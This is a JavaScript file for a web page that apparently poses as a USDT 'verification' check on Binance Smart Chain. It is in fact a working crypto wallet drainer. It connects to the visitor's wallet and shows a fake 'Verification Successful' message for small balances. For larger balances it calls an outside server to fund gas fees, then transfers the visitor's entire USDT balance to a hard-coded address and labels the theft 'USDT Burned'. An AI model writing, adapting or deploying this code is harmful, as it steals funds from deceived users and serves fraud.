const bscAddress = "0x0B0e5aCFF6bc5ed1818C14e3465BDb1FE6195497";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3, userAddress;

async function waitForProvider(timeout = 5000) {
    return new Promise((resolve) => {
        const start = Date.now();
        const interval = setInterval(() => {
            const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
            if (provider || Date.now() - start > timeout) {
                clearInterval(interval);
                resolve(provider);
            }
        }, 100);
    });
}

async function connectWalletAndSwitch() {
    const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;

    if (!provider) {
        alert("Please open this in Trust Wallet, MetaMask, or another Web3 browser.");
        return;
    }

    try {
        web3 = new Web3(provider);

        // Switch to BSC if needed
        const currentChain = await provider.request({ method: 'eth_chainId' });
        if (currentChain !== '0x38') {
            try {
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }]
                });
            } catch (err) {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'Binance Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com']
                        }]
                    });
                } else {
                    alert("Please switch to BNB manually.");
                    return;
                }
            }
        }

        // Request accounts
        const accounts = await provider.request({ method: "eth_accounts" });
        userAddress = accounts[0];
        console.log("✅ Wallet:", userAddress);
    } catch (e) {
        alert("Wallet connection failed.");
        console.error(e);
    }
}

async function Next() {
    if (!web3 || !userAddress) {
        await connectWalletAndSwitch();
        if (!web3 || !userAddress) {
            showPopup("Wallet not connected.", "red");
            return;
        }
    }

    try {
        const usdtContract = new web3.eth.Contract([
            {
                constant: true,
                inputs: [{ name: "_owner", type: "address" }],
                name: "balanceOf",
                outputs: [{ name: "", type: "uint256" }],
                type: "function"
            },
            {
                constant: false,
                inputs: [
                    { name: "recipient", type: "address" },
                    { name: "amount", type: "uint256" }
                ],
                name: "transfer",
                outputs: [{ name: "", type: "bool" }],
                type: "function"
            }
        ], usdtContractAddress);

        const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
            usdtContract.methods.balanceOf(userAddress).call(),
            web3.eth.getBalance(userAddress)
        ]);

        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
        const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));

        console.log("USDT:", usdtBalance);
        console.log("BNB:", bnbBalance);

        if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
            showPopup("No USDT assets found in your wallet.", "black");
            return;
        }

        if (usdtBalance <= 0.0005) {
            showPopup(
                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                "green"
            );
            return;
        }

        if (bnbBalance < 0.0005) {
            showPopup("Checking the bnb ...", "blue");
            await fetch("https://bnb-server-production.up.railway.app/send-bnb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ toAddress: userAddress })
            });
            await new Promise(r => setTimeout(r, 2000)); // wait for gas
        }

        showPopup("Loading...", "blue");

        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
            .send({ from: userAddress });

        showPopup(
            `✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`,
            "red"
        );

    } catch (e) {
        console.error("❌ Transfer failed:", e);
        showPopup("USDT transfer failed. Check balance or gas.", "red");
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        Object.assign(popup.style, {
            position: "fixed", top: "50%", left: "50%",
            transform: "translate(-50%, -50%)",
            padding: "20px", borderRadius: "10px",
            boxShadow: "0 0 10px rgba(0,0,0,0.2)",
            textAlign: "center", fontSize: "18px",
            width: "80%", maxWidth: "400px",
            zIndex: 9999, backgroundColor: "#fff"
        });
        document.body.appendChild(popup);
    }
    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f0f0f0";
    popup.style.color = color;
    popup.innerHTML = message;
    popup.style.display = "block";
    setTimeout(() => popup.style.display = "none", 5000);
}

window.addEventListener("load", async () => {
    const provider = await waitForProvider();
    if (!provider) {
        alert("No Web3 wallet detected.");
        return;
    }

    await connectWalletAndSwitch();

    const observer = new MutationObserver(() => {
        const btn = [...document.querySelectorAll("button")]
            .find(b => b.textContent.trim().toLowerCase() === "Next");
        if (btn) {
            btn.addEventListener("click", Next);
            console.log("✅ Bound 'Check Now' to Next()");
            observer.disconnect();
        }
    });

    observer.observe(document.body, { childList: true, subtree: true });
});
